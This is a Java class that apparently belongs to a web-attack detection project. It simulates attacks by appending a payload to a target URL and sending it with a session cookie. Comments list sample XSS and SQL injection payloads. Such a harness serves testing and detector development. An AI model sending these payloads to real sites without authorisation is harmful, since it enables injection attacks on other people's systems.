package TrafficAnomalyDetection.FDS.WebHackingDetection;

import java.net.HttpURLConnection;
import java.net.URL;

class XSStoSQLiSimulation extends AttackSimulation {
	// 부모 클래스(추상)인 AttackSimulation를 상속받아 초기화 생성자를 호출하여 url 설정	
	public XSStoSQLiSimulation(String url) {
		super(url);
	}
	
	@Override
	public int simulate(String payload, String sessionID) throws Exception {
		String attackURL = url + payload;
			// ?query=<script>alert('XSS')</script>
			// ?user=' OR '1'='1
			// ?input="/ ?csrftoken="
		// String secureCodingURL = URLEncoder.encode(attackURL, "UTF-8");
		
		HttpURLConnection connection = (HttpURLConnection) new URL(attackURL)
				.openConnection();
		connection.setRequestMethod("GET");
		
        connection.setRequestProperty(
        		"Cookie", "PHPSESSID=" + sessionID);
		int httpResponseCode = connection.getResponseCode();
		return httpResponseCode; // HTTP Response Code(Cross-Site Scripting, XSS)
	}
}